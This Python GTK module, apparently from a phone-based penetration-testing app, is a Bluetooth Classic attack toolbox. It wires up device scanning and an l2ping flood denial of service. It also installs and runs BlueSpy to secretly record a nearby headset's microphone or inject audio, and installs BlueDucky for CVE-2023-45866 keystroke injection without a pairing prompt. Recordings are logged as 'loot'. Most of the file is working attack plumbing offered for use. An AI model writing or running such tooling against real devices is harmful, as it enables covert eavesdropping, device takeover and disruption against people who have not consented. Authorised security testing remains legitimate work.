"""Bluetooth arsenal (Classic BR/EDR side).

The BLE surface is covered by ``ble_track``, ``ble_prov``,
``ble_attack``, ``blespam`` and ``blueducky``. This module owns the
Bluetooth *Classic* side: BR/EDR scanning, SDP browse, L2CAP DoS,
BlueSpy audio hijack, and MyName-Is-Keyboard (CVE-2023-45866) HID
injection.

Every action here works with the phone's built-in Bluetooth adapter
-- no Ubertooth / Sniffle / ESP32 needed. Framework-level BR/EDR
vulnerability testing (KNOB / BIAS / BLUFFS / BleedingTooth) lives
in the sibling ``bluetoolkit`` module because it's a much larger
install.
"""
from __future__ import annotations

from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, ToolRunner, toast

# --- BlueSpy install target -----------------------------------------
BLUESPY_DIR = Path("/opt/bluespy")
BLUESPY_REPO = "https://github.com/TarlogicSecurity/BlueSpy"

# --- BlueDucky install target ---------------------------------------
BLUEDUCKY_DIR = Path("/opt/blueducky")
BLUEDUCKY_REPO = "https://github.com/pentestfunctions/BlueDucky"


@register
class Bluetooth(NHModule):
    title = "Bluetooth"
    icon = "bluetooth-symbolic"
    description = ("Bluetooth Classic (BR/EDR) toolbox: scan, SDP, "
                   "L2CAP DoS, BlueSpy audio hijack, MyName HID "
                   "injection.")
    required_tools = ["bluetoothctl"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # ---- adapter state -------------------------------------
        adapter = Adw.PreferencesGroup(
            title="Adapter",
            description="Bring the adapter up / down and switch it "
                        "between discoverable / bondable modes.")
        self.hci = Adw.EntryRow(title="HCI adapter")
        self.hci.set_text("hci0")
        adapter.add(self.hci)

        for label, subtitle, cmd in (
            ("Power on", "bluetoothctl power on",
             "bluetoothctl power on"),
            ("Power off", "bluetoothctl power off",
             "bluetoothctl power off"),
            ("Discoverable + pairable + no-input-no-output",
             "btmgmt bondable on; btmgmt io-cap 3",
             "btmgmt bondable on && btmgmt io-cap 3 && "
             "btmgmt discov yes && bluetoothctl "
             "discoverable-timeout 0 && bluetoothctl "
             "pairable on"),
            ("Restore normal (non-discoverable, io-cap 0)",
             "btmgmt discov no; io-cap 0",
             "btmgmt discov no && btmgmt io-cap 0"),
        ):
            self._row(adapter, label, subtitle, cmd, root=True)
        box.append(adapter)

        # ---- target ------------------------------------------
        target = Adw.PreferencesGroup(
            title="Target",
            description="MAC of the BR/EDR device we're going to poke.")
        self.mac = Adw.EntryRow(
            title="Target MAC (AA:BB:CC:DD:EE:FF)")
        target.add(self.mac)
        box.append(target)

        # ---- BR/EDR recon ------------------------------------
        recon = Adw.PreferencesGroup(
            title="BR/EDR recon",
            description="Discover devices, browse SDP, verify "
                        "reachability.")
        self._row(recon,
                  "BR/EDR inquiry (hcitool scan)",
                  "Classic device discovery, faster than bluetoothctl",
                  "hcitool -i $HCI scan --length 10 --numrsp 20",
                  root=True, mac_optional=True)
        self._row(recon,
                  "SDP browse",
                  "sdptool browse -- profiles + services",
                  "sdptool browse $MAC",
                  root=True)
        self._row(recon,
                  "L2CAP ping",
                  "l2ping -c 3 -- alive check",
                  "l2ping -i $HCI -c 3 $MAC",
                  root=True)
        self._row(recon,
                  "Info",
                  "bluetoothctl info -- lots of features + class",
                  "bluetoothctl info $MAC",
                  root=True)
        box.append(recon)

        # ---- DoS -------------------------------------------
        dos = Adw.PreferencesGroup(
            title="DoS",
            description="Only against systems you own. l2ping flood "
                        "used to be reliable against feature-phones; "
                        "on modern targets it's more of a keep-alive "
                        "denial than a crash.")
        self._row(dos,
                  "L2CAP ping flood (l2ping -f -s 600)",
                  "Large payload, flood; press Stop to end",
                  "l2ping -i $HCI -f -s 600 $MAC",
                  root=True, streaming=True)
        box.append(dos)

        # ---- BlueSpy audio hijack -------------------------
        bs = Adw.PreferencesGroup(
            title="Audio hijack (BlueSpy, Tarlogic)",
            description="Just-Works Bluetooth speaker/headset "
                        "abuse: pair without user interaction, "
                        "record the mic / play arbitrary audio.")

        install_row = Adw.ActionRow(
            title="Install BlueSpy",
            subtitle=str(BLUESPY_DIR) +
                     (" -- installed" if
                      (BLUESPY_DIR / "BlueSpy.py").exists()
                      else " -- not installed"))
        install_btn = Gtk.Button(label="Install",
                                 valign=Gtk.Align.CENTER)
        install_btn.add_css_class("suggested-action")
        install_btn.connect(
            "clicked", lambda _b: self._install_bluespy(install_row))
        install_row.add_suffix(install_btn)
        bs.add(install_row)

        # Where to drop recordings. Default matches the operator's
        # Records folder; editable at runtime for one-off targets.
        self.record_dir = Adw.EntryRow(
            title="Recordings folder")
        self.record_dir.set_text("/home/kali/Records")
        bs.add(self.record_dir)

        # BlueSpy has no built-in duration flag; ``parecord`` under
        # the hood runs until SIGTERM. We wrap the call in ``timeout
        # <N>`` so the operator can pick how long the recording
        # should last. 0 = manual (Stop button).
        self.record_duration = Adw.SpinRow.new_with_range(
            0, 3600, 5)
        self.record_duration.set_title(
            "Duration (s) -- 0 = manual Stop")
        self.record_duration.set_value(30)
        bs.add(self.record_duration)

        rec_row = Adw.ActionRow(
            title="Record microphone",
            subtitle="python BlueSpy.py -a $MAC -f <dir>/"
                     "bluespy-<ts>.wav")
        rec_btn = Gtk.Button(label="Record",
                             valign=Gtk.Align.CENTER)
        rec_btn.add_css_class("suggested-action")
        rec_btn.connect("clicked",
                         lambda _b: self._bluespy_record())
        rec_row.add_suffix(rec_btn)
        stop_btn = Gtk.Button(label="Stop",
                              valign=Gtk.Align.CENTER)
        stop_btn.connect("clicked",
                          lambda _b: self._bluespy_stop())
        rec_row.add_suffix(stop_btn)
        bs.add(rec_row)

        self.play_file = Adw.EntryRow(
            title="Audio file to play (WAV/MP3)")
        self.play_file.set_text("/tmp/nhp-silence.wav")
        bs.add(self.play_file)
        self._row(bs,
                  "Play file to speaker",
                  "paplay to the paired sink; silences legit playback",
                  "paplay -d $(pactl list short sinks | "
                  "grep bluez | awk '{print $2}' | head -1) "
                  "$PLAYFILE",
                  root=True)

        box.append(bs)

        # ---- MyName Is Keyboard --------------------------
        my = Adw.PreferencesGroup(
            title="MyName Is Keyboard (CVE-2023-45866)",
            description="HID keystroke injection against unpatched "
                        "Android < 14, iOS < 17.2, Linux, macOS. "
                        "Zero pairing prompt on the victim.")
        install_row2 = Adw.ActionRow(
            title="Install BlueDucky",
            subtitle=str(BLUEDUCKY_DIR) +
                     (" -- installed" if
                      (BLUEDUCKY_DIR / "BlueDucky.py").exists()
                      else " -- not installed"))
        install_btn2 = Gtk.Button(label="Install",
                                  valign=Gtk.Align.CENTER)
        install_btn2.add_css_class("suggested-action")
        install_btn2.connect(
            "clicked",
            lambda _b: self._install_blueducky(install_row2))
        install_row2.add_suffix(install_btn2)
        my.add(install_row2)

        run_row = Adw.ActionRow(
            title="Run BlueDucky against target",
            subtitle="Full workflow (already there? Deep-link to "
                     "the BlueDucky module for payload picking)")
        run_btn = Gtk.Button(label="Open BlueDucky",
                             valign=Gtk.Align.CENTER)
        run_btn.connect(
            "clicked",
            lambda _b: self.app_window.activate_module(
                "blueducky", self.mac.get_text().strip()))
        run_row.add_suffix(run_btn)
        my.add(run_row)
        box.append(my)

        # ---- deep-links ----------------------------------
        chain = Adw.PreferencesGroup(
            title="Chain",
            description="Sibling BT modules.")
        for label, mod_id in (
            ("BLE tracker",       "ble_track"),
            ("BLE provisioning",  "ble_prov"),
            ("BLE attacks",       "ble_attack"),
            ("BLE spam",          "blespam"),
            ("BlueDucky",         "blueducky"),
            ("BlueToolkit (BR/EDR framework)", "bluetoolkit"),
        ):
            r = Adw.ActionRow(title=label,
                              subtitle="-> " + mod_id)
            btn = Gtk.Button(label="Open",
                             valign=Gtk.Align.CENTER)
            btn.connect(
                "clicked",
                lambda _b, m=mod_id:
                    self.app_window.activate_module(m, ""))
            r.add_suffix(btn)
            chain.add(r)
        box.append(chain)

        self.runner = ToolRunner()
        box.append(self.runner)
        return box

    # ------------------------------------------------------ helpers
    def _row(self, group, title: str, subtitle: str, cmd: str,
             *, root: bool = False, mac_optional: bool = False,
             streaming: bool = False,
             label: str = "Run", suggested: bool = False) -> None:
        row = Adw.ActionRow(title=title, subtitle=subtitle)
        btn = Gtk.Button(label=label, valign=Gtk.Align.CENTER)
        if suggested:
            btn.add_css_class("suggested-action")
        btn.connect(
            "clicked",
            lambda _b, c=cmd, s=streaming, mo=mac_optional:
                self._run(c, root=root, streaming=s,
                           mac_optional=mo))
        row.add_suffix(btn)
        group.add(row)

    def _run(self, cmd: str, *, root: bool = False,
             streaming: bool = False,
             mac_optional: bool = False) -> None:
        hci = self.hci.get_text().strip() or "hci0"
        mac = self.mac.get_text().strip()
        playfile = self.play_file.get_text().strip() \
            if hasattr(self, "play_file") else ""
        if "$MAC" in cmd and not mac and not mac_optional:
            toast(self.app_window, "Set a target MAC first")
            return
        script = (cmd
                  .replace("$HCI", hci)
                  .replace("$MAC", mac or "")
                  .replace("$PLAYFILE", playfile))
        if streaming:
            # Long-running (l2ping flood); ownable Process so we can
            # stop it separately.
            self.runner.run(["sh", "-c", script], root=root)
        else:
            self.runner.run(["sh", "-c", script], root=root)

    # ---------------------------------------------------- BlueSpy
    def _bluespy_record(self) -> None:
        """Run BlueSpy.py against the current MAC. We wrap the call
        in ``timeout <N>`` so the operator's chosen duration ends
        the recording cleanly; duration 0 falls through to a plain
        run that the Stop button terminates. The output filename is
        stamped so the operator can trigger multiple recordings in
        the same session without clobbering the previous file."""
        mac = self.mac.get_text().strip()
        if not mac:
            toast(self.app_window, "Set a target MAC first")
            return
        if not (BLUESPY_DIR / "BlueSpy.py").exists():
            toast(self.app_window,
                  "Install BlueSpy first")
            return

        rec_dir = (self.record_dir.get_text().strip()
                    or "/home/kali/Records")
        duration = int(self.record_duration.get_value())
        stamp = __import__("time").strftime("%Y%m%d-%H%M%S")
        safe_mac = mac.replace(":", "")
        outfile = "%s/bluespy-%s-%s.wav" % (
            rec_dir, safe_mac, stamp)

        # Build the command. BlueSpy.py wants the output on ``-f``,
        # not ``-o`` (that was a bug in the earlier version of this
        # module). ``timeout`` from coreutils is the cheap way to
        # bound the run without a shell trap.
        core = ("python3 BlueSpy.py -a %s -f %s"
                % (mac, outfile))
        if duration > 0:
            core = "timeout --signal=INT %d %s" % (duration, core)

        script = (
            "mkdir -p %s && "
            "chown kali:kali %s 2>/dev/null || true; "
            "cd %s && %s"
        ) % (rec_dir, rec_dir, BLUESPY_DIR, core)

        self.runner.output.append(
            "# recording %s → %s (%s)\n"
            % (mac, outfile,
                ("%ds" % duration) if duration else "manual"))
        # ToolRunner owns the subprocess and its Stop button is at
        # the bottom of the module -- the local Stop button also
        # calls into it.
        self.runner.run(["sh", "-c", script], root=True)
        # Register the loot row up front so the file shows up in
        # Loot even if the process is killed early.
        get_loot_store().record(
            module="bluetooth", type="bluespy_wav",
            target=mac, path=outfile,
            notes="BlueSpy recording (%s)"
                   % (("%ds" % duration) if duration
                      else "manual stop"))

    def _bluespy_stop(self) -> None:
        # ToolRunner has its own Stop button too, but wire our local
        # one to the same underlying subprocess so the operator can
        # stop from where they started.
        self.runner.stop()

    def _install_bluespy(self, row: Adw.ActionRow) -> None:
        script = (
            "set -e; "
            "if [ ! -d %s/.git ]; then "
            "  git clone --depth 1 %s %s; "
            "else "
            "  git -C %s pull --ff-only || true; "
            "fi; "
            "chown -R kali:kali %s || true; "
            "echo ---installed---"
        ) % (BLUESPY_DIR, BLUESPY_REPO, BLUESPY_DIR,
             BLUESPY_DIR, BLUESPY_DIR)

        def done(r: Result) -> None:
            self.runner.output.append(r.stdout or "")
            if r.stderr:
                self.runner.output.append(r.stderr)
            row.set_subtitle(str(BLUESPY_DIR) +
                              (" -- installed" if
                               (BLUESPY_DIR / "BlueSpy.py").exists()
                               else " -- install failed"))
            toast(self.app_window, "BlueSpy install finished")

        run_async(["sh", "-c", script], done,
                  root=True, timeout=300)

    def _install_blueducky(self, row: Adw.ActionRow) -> None:
        script = (
            "set -e; "
            "if [ ! -d %s/.git ]; then "
            "  git clone --depth 1 %s %s; "
            "else "
            "  git -C %s pull --ff-only || true; "
            "fi; "
            "chown -R kali:kali %s || true; "
            "echo ---installed---"
        ) % (BLUEDUCKY_DIR, BLUEDUCKY_REPO, BLUEDUCKY_DIR,
             BLUEDUCKY_DIR, BLUEDUCKY_DIR)

        def done(r: Result) -> None:
            self.runner.output.append(r.stdout or "")
            if r.stderr:
                self.runner.output.append(r.stderr)
            row.set_subtitle(str(BLUEDUCKY_DIR) +
                              (" -- installed" if
                               (BLUEDUCKY_DIR / "BlueDucky.py").exists()
                               else " -- install failed"))
            toast(self.app_window, "BlueDucky install finished")

        run_async(["sh", "-c", script], done,
                  root=True, timeout=300)

    def set_target(self, target: str) -> None:
        if target:
            self.mac.set_text(target.split("|")[0].strip())
